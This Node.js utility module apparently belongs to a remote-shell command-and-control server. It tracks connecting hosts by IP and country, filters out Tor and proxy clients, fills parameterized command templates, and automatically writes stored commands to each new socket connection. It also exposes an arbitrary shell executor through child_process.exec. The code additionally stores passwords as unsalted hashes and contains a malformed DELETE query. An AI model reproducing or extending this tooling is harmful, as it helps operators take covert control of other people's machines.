var sqlite3 = require('sqlite3');
var crypto = require('crypto');
const req = require('express/lib/request');
require('dotenv').config()
const axios = require('axios');
let db = new sqlite3.Database('./database.db', sqlite3.OPEN_READWRITE, (err) => {});
var config = require('../config');
const jwt = require('jsonwebtoken');
var xss = require("xss");
const zlib = require('zlib');

const { exec} = require('child_process');
const { env } = require('process');
const { resolve } = require('path');



function generateAccessToken(username) {
    return jwt.sign(username, process.env.TOKEN_SECRET, { expiresIn: config.settings.token_expire });
  }


function execute_command(command){
    
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            return;
        }
       
    });
}



function change_user_password_db(username, password, callback) {
    var hash = crypto.createHash('sha512');
    password = hash.update(password, 'utf-8');
    password = password.digest('hex');
    db.run("UPDATE users SET  password = (?) WHERE username = (?)", [password, username], function (err) {
        if (err) {
            console.log(err)
        } else {
            callback(true)
        }
    });


}

function login_db(username, password, callback) {
    return new Promise(resolve => {

    var hash = crypto.createHash('sha512');
    password = hash.update(password, 'utf-8');
    password = password.digest('hex');
    db.all("SELECT * FROM users WHERE username = (?) AND password = (?)", [username, password], (err, rows) => {
        if (rows.length > 0) {
            resolve(true)
        } else {
            resolve(false)
        }
    });
});

}

function get_total_session_by_username(username, callback) {
    return new Promise(resolve => {

    db.all("SELECT COUNT(session_number) FROM sessions WHERE username = (?)", [username], (err, rows) => {
        if (rows.length > 0) {
            let return_rows = Object.values(rows[0])[0]
            resolve(return_rows)
        } else {
            resolve(false)
        }
    });
})


}
function get_total_sessions() {
    return new Promise(resolve => {

    db.all("SELECT id FROM connections ", (err, rows) => {
        let found_sessions = []
        if (rows.length > 0) {
            // let return_rows = Object.values(rows[0])[0]
            for(i=0;i<rows.length;i++) {
                
                if(!found_sessions.includes(rows[i].id)){
                    found_sessions.push(rows[i].id)
                }

            }
            resolve(found_sessions)
        } else {
            resolve(0)
        }
    });
})

}


function get_all_commands_db() {
    return new Promise(resolve => {

    db.all("SELECT * FROM commands", (err, rows) => {
        resolve(rows)
    });
});

}
const delete_auto_command = (title)=>{
    return new Promise(resolve => {
        db.run("DELETE FROM commands WHERE title=(?)",[title],function (err) {
            if (err) {
                console.log(err)
               resolve(false)
            } else {
                
                 resolve(true)
            }
        })
    })

}

async function add_ip_to_connections(id,ip,country){
    if(country == null) 
    country = "other"
    return new Promise(resolve => {
    db.run("INSERT INTO connections (id,ip,country) VALUES (?,?,?)", [id, ip,country], function (err) {
        if (err) {
            console.log(err)
           resolve(false)
        } else {
            
             resolve(true)
        }
    });
})
}
async function ip_info(ip){
    return new Promise(resolve => {
        axios.get("http://ip-api.com/json/"+ip).then(result=>{
            resolve(result.data.country);
        })
        
    })
}
async function clean_connections(){
    return new Promise(resolve => {
        db.run("DELETE FROM connections",function (err) {
            if (err) {
                console.log(err)
               resolve(false)
            } else {
                
                 resolve(true)
            }
            
    })
        
    })
}
async function all_country_connections(){
    return new Promise(resolve => {
        db.all("SELECT country FROM connections", (err, rows) => {
            var counts = {};

            
            rows.forEach(function(x) { counts[x.country] = (counts[x.country] || 0)+1; });
            resolve(counts)
        });
        
    })
}

async function ip_flag(ip){
    return new Promise(resolve => {
        try{
    axios.get("https://ipapi.com/ip_api.php?ip="+ip).then(res=>{
        
        resolve(res.data.location.country_flag)
    }).catch(err=>{})
}catch(e){}
})
}
function delete_ip_from_connections(id){
    return new Promise(resolve => {
    db.run("DELETE FROM connections WHERE id = (?)", [id], function (err) {
        if (err) {
            console.log(err)
            resolve(false)
        } else {
        resolve(true)
        }
    });
    })
}

function get_command_by_title(title, callback) {
    db.all("SELECT * FROM commands ", (err, rows) => {
        let return_rows = []
        for (i = 0; i < rows.length; i++) {
            if (rows[i].title.includes(title))
                return_rows.push({
                    title: rows[i].title,
                    des: rows[i].des,
                    command: rows[i].command
                })
        }
        callback(return_rows)
    });
}

function all_data(callback){
    db.all("SELECT username,role FROM users", (err, rows) => {
        
        callback(rows)
    });
}

function isValidHttpUrl(string) {
    let url;

    try {
        url = new URL(string);
    } catch (_) {
        return false;
    }

    return url.protocol === "http:" || url.protocol === "https:";
}

function add_command(title, des, command, callback) {
    db.run("INSERT INTO commands (title,des,command) VALUES (?,?,?)", [title, des, command], function (err) {
        if (err) {
            callback(false)
        } else {
            callback(true)
        }
    });
}



function get_sessions_by_username(username, callback) {
    db.all("SELECT * FROM sessions WHERE username = (?)", [username], (err, rows) => {
        let rows_return = []
        for (i = 0; i < rows.length; i++) {
            rows_return.push(rows[i].session_number)
        }
        callback(rows_return)

    });
}



async function get_users_by_sesison_number(session){
    return new Promise(resolve => {
        let response = ""
        db.all("SELECT username FROM sessions WHERE session_number=(?)",[session], (err, rows) => {
            if(rows.length  == 0)
            resolve("there are no users")
            for(i=0;i<rows.length;i++){
                response = response + rows[i].username+","
            }
            response = response.slice(0, -1)
            resolve(response)
        })
    })
}

function sleep(ms) {
    return new Promise((resolve) => {
      setTimeout(resolve, ms);
    });
}
function ipdata_check_ip(ip){
    return new Promise((resolve) => {
        try{
            if(!config.settings.block_proxy && !config.settings.block_anonymous && !config.settings.block_tor){
                resolve(false)
            }
    axios.get(`https://api.ipdata.co/${ip}?api-key=${process.env.ipdata_APIKEY}`).then(res=>{
    if(config.settings.block_tor){
        if(res.data.threat.is_tor){
            resolve(true)
        }
    }
    if(config.settings.block_anonymous){
        if(res.data.threat.is_anonymous){
            resolve(true)
        }
    }
    if(config.settings.block_proxy){
        if(res.data.threat.is_proxy){
            resolve(true)
        }
    }
    resolve(false)
    

    }).catch(err=>{resolve(false)})
}catch(e){resolve(false)}
});
}
class command_param{
    param1(command,args){
        try{
            let c1 = /(kiraC1_.*_kiraC1)/.exec(command)[0]
            
            if(c1){
                    c1 = c1.replace("kiraC1_","").replace("_kiraC1","")
                    command = command.replace(/(kiraC1_.*_kiraC1)/,args[0].replace("\n",""))
                    if(args.length > 0){
                        return this.params2(command,args)
                    }else{
                        return command
                    }
                }
            }catch(e){
                return command
            }
    }
    params2(command,args){
        
        let c1 = /(kiraC2_.*_kiraC2)/.exec(command)[0]
        try{
 
        if(c1){
                c1 = c1.replace("kiraC2_","").replace("_kiraC2","")
                command = command.replace(/(kiraC2_.*_kiraC2)/,args[1].replace("\n",""))
                if(args.length > 1){
                    return this.params3(command,args)
                }else{
                    return command

                }
            }
        }catch(e){
            return command
        }
    }
    params3(command,args){
        
        let c1 = /(kiraC3_.*_kiraC3)/.exec(command)[0]
        try{
 
        if(c1){
                c1 = c1.replace("kiraC3_","").replace("_kiraC3","")
                command = command.replace(/(kiraC3_.*_kiraC3)/,args[2].replace("\n",""))
                    return command
            }
        }catch(e){
            return command
        }
    }
}
function run_command(command){
    return new Promise(resolve => {

    let  split_command = command.split(" ")
    let args = split_command.slice(2,10)
    if(split_command[0] == "run"){
        get_command_by_title(split_command[1].replace(/\s/gi,""),data=>{
            if(data.length == 0) {
                resolve(command)
                return
            }
            const handle_command = new command_param();
            const res = handle_command.param1(data[0].command,args)
            resolve(res)
        })
        
    }else{
        resolve(command)
    }
})
}

const get_user_from_token = (token)=>{
    return new Promise(resolve => {

    jwt.verify(token, process.env.TOKEN_SECRET, (err,user)=> {
        if (err){
            resolve(err)
        }
        resolve(user.username)
      })
    })
}

const check_login_user =  (req,res,next) =>{
        const token = req.cookies.session
        if (token == null) return res.redirect("/login")
        jwt.verify(token, process.env.TOKEN_SECRET, (err,user)=> {
          if (err){
            res.redirect("/login")
          }else{
            next()

          }
        })

}

const get_all_on_connection_commands = ()=>{
    return new Promise(resolve => {

    db.all("SELECT * FROM on_connection_command", (err, rows) => {
        if (rows.length > 0) {
            resolve(rows)
        } else {
            resolve(false)
        }
    });
})
}
const add_on_connection_command = (title,description,command)=>{
    return new Promise(resolve => {

    db.run("INSERT INTO on_connection_command (title,description,command) VALUES (?,?,?)", [title, description, command], function (err) {
        if (err) {
            console.log(err)
            resolve(false)
        } else {
            resolve(true)
        }
    });
});

}
const delete_on_connection_command = (id)=>{
    return new Promise(resolve => {
        db.run("DELETE FROM on_connection_command WHERE id = (?)", [id], function (err) {
            if (err) {
                console.log(err)
                resolve(false)
            } else {
            resolve(true)
            }
        });
        })

}
const on_connection_command_run =async (socket)=>{
    const commands = await get_all_on_connection_commands()
    for(i = 0; i < commands.length; i++) {
        socket.write(`${commands[i].command} \n`)
    }
    
}

const delete_note = async (id)=>{
        return new Promise(resolve => {
            db.run("DELETE FROM sessions_notes WHERE id = (?)", [id], function (err) {
                if (err) {
                    console.log(err)
                    resolve(false)
                } else {
                resolve(true)
                }
            });
            })
    
}
const delete_all_note = async ()=>{
    return new Promise(resolve => {
        db.run("DELETE * sessions_notes", function (err) {
            if (err) {
                console.log(err)
                resolve(false)
            } else {
            resolve(true)
            }
        });
        })

}
const add_note = async (username,note,session)=>{
    note = xss(note)
    return new Promise(resolve => {
        db.run("INSERT INTO sessions_notes (username,note,session_id) VALUES (?,?,?)", [username,note,session], function (err) {
            if (err) {
                console.log(err)
                resolve(false)
            } else {
            resolve(true)
            }
        });
        })

}

const get_notes_by_id = (id)=>{
    return new Promise(resolve => {
    db.all("SELECT * FROM sessions_notes WHERE session_id = (?)",[id], (err, rows) => {
        if(err){
            console.log(err)
        }
        if (rows.length > 0) {
            resolve(rows)
        } else {
            resolve(false)
        }
    });
})
}

function AES_encrypt(text,key,iv) {
    iv = Buffer.from(iv,'hex')
    key = Buffer.from(key,'hex')

    let cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key), iv);
 let encrypted = cipher.update(text);
 encrypted = Buffer.concat([encrypted, cipher.final()]);
 return { iv: iv.toString('hex'), encryptedData: encrypted.toString('hex'),key:key.toString('hex') };
}

function AES_decrypt(text,key,iv) {
    iv = Buffer.from(iv, 'hex');
key = Buffer.from(key,'hex')

 let encryptedText = Buffer.from(text.encryptedData, 'hex');
 let decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(key), iv);
 let decrypted = decipher.update(encryptedText);
 decrypted = Buffer.concat([decrypted, decipher.final()]);
 return decrypted.toString();
}
const gzip_compress = (compress_data)=>{
    return new Promise(resolve => {
        zlib.gzip(compress_data , (error, data) => {
        
            if(!error)
            {
              resolve(data)
          }
            else{
              console.log(err);
            }
          
          
            if(!error)
            {
            }
            else{
              console.log(err);
            }
          
          });
  
        
    })
        
}

const unzip = (compress_data)=>{
    return new Promise(resolve => {
        zlib.unzip(compress_data, (err, buffer) => {
  
            resolve(buffer.toString('utf8'));
              
            });
    })
        }

module.exports = {
    AES_encrypt,
    AES_decrypt,
    run_command,
    execute_command,
    login_db,
    isValidHttpUrl,
    get_all_commands_db,
    get_command_by_title,
    add_command,
    get_sessions_by_username,
    change_user_password_db,
    get_total_session_by_username,
    all_data,
    add_ip_to_connections,
    delete_ip_from_connections,
    ip_info,
    clean_connections,
    all_country_connections,
    ip_flag,
    get_total_sessions,
    get_users_by_sesison_number,
    sleep,
    ipdata_check_ip,
    check_login_user,
    generateAccessToken,
    get_user_from_token,
    on_connection_command_run,
    add_on_connection_command,
    get_all_on_connection_commands,
    delete_on_connection_command,
    delete_auto_command,
    delete_note,
    add_note,
    delete_all_note,
    get_notes_by_id,
    
}